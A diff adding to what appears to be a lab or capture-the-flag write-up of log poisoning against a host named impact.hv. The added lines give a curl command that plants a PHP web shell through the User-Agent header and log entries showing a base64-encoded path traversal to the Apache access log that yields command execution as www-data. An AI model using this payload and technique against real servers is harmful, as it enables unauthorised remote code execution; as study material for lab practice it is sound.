@@ -84,4 +84,13 @@ Checking the access.log file again, you can see that the injection was successfu
 10.8.58.60 - - [14/Oct/2025:18:40:10 -0400] "GET / HTTP/1.1" 200 5576 "-" "Hello World"
 #+end_src
 
+It was possible to identify that this simple php payload was executed, but when trying something like system() or others, the server does not process correctly and generates 500 internal error
 
+using this payload I managed to inject without causing an error ->
+: curl -v -A "<?php system(\$_GET['cmd']); ?>" http://impact.hv/
+
+and now the RCE is possible ->
+#+begin_src javascript
+10.8.58.60 - - [14/Oct/2025:19:10:40 -0400] "GET /search.php?name=Li4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzcy5sb2c%3d HTTP/1.1" 200 1060 "http://impact.hv/profile.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+10.8.58.60 - - [14/Oct/2025:19:11:00 -0400] "GET / HTTP/1.1" 200 5576 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
+#+end_src
